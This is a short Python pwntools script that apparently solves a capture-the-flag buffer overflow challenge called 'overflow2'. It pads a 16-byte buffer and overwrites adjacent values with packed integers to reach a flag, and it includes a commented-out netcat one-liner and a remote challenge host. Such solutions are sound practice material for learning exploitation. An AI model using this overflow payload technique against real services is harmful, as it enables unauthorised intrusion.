#python -c "print('A'*16 + '\x39\x05\x00\x00\x02\x00\x00\x00')" | nc localhost 9001
from pwn import *

r = process("source/overflow2")
#r = remote("overflow101.heltsikker.no", 9001)

exploit = b'A'*16
exploit += p32(1337)
exploit += p32(2)
exploit += p32(1)

r.sendline(exploit)
r.recvuntil('flag!\n')
print(r.recvline())
